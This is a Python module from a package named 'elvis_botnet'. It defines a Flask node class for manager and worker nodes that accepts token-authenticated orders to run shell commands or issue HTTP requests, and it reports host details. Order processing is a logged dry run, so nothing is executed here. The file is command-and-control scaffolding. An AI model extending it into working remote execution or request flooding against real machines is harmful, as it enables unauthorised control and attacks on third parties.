import configparser
import hmac
import logging
import platform
import socket
import uuid
from datetime import datetime, timezone
from urllib.parse import urlsplit

from flask import Flask, jsonify, request

from elvis_botnet.order import JSONValue, Order, OrderType
from elvis_botnet.orderqueue import OrderQueue


class Node:
    """Common base for manager and worker nodes.

    Wraps a Flask app exposing the HTTP surface shared by every node type
    (health check, self-reported system info) and the bookkeeping every
    node needs regardless of role: a stable identity (``node_id``), a
    configured static IP for the peer table, and counters for commands
    received/completed. Subclasses (``Manager``, ``Worker``) add their own
    routes and peer-tracking state on top of this.
    """

    node_type = "node"

    def __init__(self, config: configparser.ConfigParser) -> None:
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.hostname = socket.gethostname()
        self.static_ip = config["node"].get("ip", "")
        # Fall back to a freshly generated GUID if the config doesn't pin one down.
        self.node_id = config["node"].get("id") or str(uuid.uuid4())
        self.started_at = datetime.now(timezone.utc)
        self.commands_received = 0
        self.commands_completed = 0
        self.order_queue = OrderQueue()
        self.order_token = config.get("auth", "order_token", fallback="")

        self.app = Flask(__name__)
        self.register_routes()

    def process_pending_orders(self) -> int:
        """Drain pending orders by logging what would happen; perform no action."""
        processed = 0
        while order := self.order_queue.take_next():
            order.mark_processing()
            self.commands_received += 1
            self.logger.info(
                "Dry run: would process order %s of kind %s from node %s",
                order.order_id,
                order.kind.value,
                order.origin_node_id,
            )
            order.mark_completed()
            self.commands_completed += 1
            processed += 1
        return processed

    @staticmethod
    def parse_peer_list(config: configparser.ConfigParser, key: str) -> list[str]:
        # Primitive peer table: a static, comma-separated list read from the [peers] config section.
        if not config.has_section("peers"):
            return []
        raw = config["peers"].get(key, "")
        return [ip.strip() for ip in raw.split(",") if ip.strip()]

    def register_routes(self):
        self.app.add_url_rule(
            "/health",
            view_func=self.health,
            methods=["GET"]
        )
        self.app.add_url_rule(
            "/info",
            view_func=self.info,
            methods=["GET"]
        )
        self.app.add_url_rule(
            "/orders",
            view_func=self.receive_order,
            methods=["POST"]
        )

    def health(self):
        return jsonify({"status": "ok"})

    def info(self):
        return jsonify(self.node_info())

    def receive_order(self):
        if not self.order_token:
            return jsonify({"error": "order submission unavailable"}), 503

        authorization = request.headers.get("Authorization", "")
        scheme, separator, token = authorization.partition(" ")
        if (
            not separator
            or scheme.lower() != "bearer"
            or not hmac.compare_digest(token, self.order_token)
        ):
            return jsonify({"error": "invalid order"}), 401

        data = request.get_json(silent=True)
        if not isinstance(data, dict):
            return jsonify({"error": "invalid order"}), 400
        if set(data) - {"origin_node_id", "kind", "payload", "order_id"}:
            return jsonify({"error": "invalid order"}), 400

        origin_node_id = data.get("origin_node_id")
        kind_value = data.get("kind")
        payload = data.get("payload")
        order_id = data.get("order_id")
        if (
            not isinstance(origin_node_id, str)
            or not origin_node_id.strip()
            or not isinstance(kind_value, str)
            or not isinstance(payload, dict)
            or (
                "order_id" in data
                and (not isinstance(order_id, str) or not order_id.strip())
            )
        ):
            return jsonify({"error": "invalid order"}), 400

        try:
            kind = OrderType(kind_value)
        except ValueError:
            return jsonify({"error": "invalid order"}), 400

        if not self._valid_order_payload(kind, payload):
            return jsonify({"error": "invalid order"}), 400

        if "order_id" in data:
            order = Order(
                origin_node_id=origin_node_id,
                kind=kind,
                payload=payload,
                order_id=order_id
            )
        else:
            order = Order(
                origin_node_id=origin_node_id,
                kind=kind,
                payload=payload,
            )
        try:
            self.order_queue.enqueue(order)
        except ValueError:
            return jsonify({"error": "invalid order"}), 400

        return jsonify({"order_id": order.order_id, "status": order.status.value}), 202

    @staticmethod
    def _valid_order_payload(kind: OrderType, payload: dict[str, JSONValue]) -> bool:
        if kind is OrderType.EXECUTE:
            command = payload.get("command")
            arguments = payload.get("arguments", [])
            return (
                set(payload) <= {"command", "arguments"}
                and isinstance(command, str)
                and bool(command.strip())
                and isinstance(arguments, list)
                and all(isinstance(argument, str) for argument in arguments)
            )

        method = payload.get("method")
        url = payload.get("url")
        headers = payload.get("headers", {})
        try:
            parsed_url = urlsplit(url) if isinstance(url, str) else None
        except ValueError:
            return False
        return (
            set(payload) <= {"method", "url", "headers", "body"}
            and isinstance(method, str)
            and method in {"GET", "HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"}
            and parsed_url is not None
            and parsed_url.scheme in {"http", "https"}
            and bool(parsed_url.netloc)
            and isinstance(headers, dict)
            and all(
                isinstance(name, str) and isinstance(value, str)
                for name, value in headers.items()
            )
        )

    def get_ip_address(self) -> str:
        # Route through a UDP socket (no packets sent) to find the outbound interface IP.
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.connect(("9.9.9.9", 80))
                return sock.getsockname()[0]
        except OSError:
            return socket.gethostbyname(self.hostname)

    def node_info(self) -> dict:
        return {
            "node_id": self.node_id,
            "node_type": self.node_type,
            "hostname": self.hostname,
            "ip_address": self.get_ip_address(),
            "static_ip": self.static_ip,
            "platform": platform.platform(),
            "python_version": platform.python_version(),
            "started_at": self.started_at.isoformat(),
            "commands_received": self.commands_received,
            "commands_completed": self.commands_completed,
        }

    def run(self, **kwargs):
        self.app.run(**kwargs)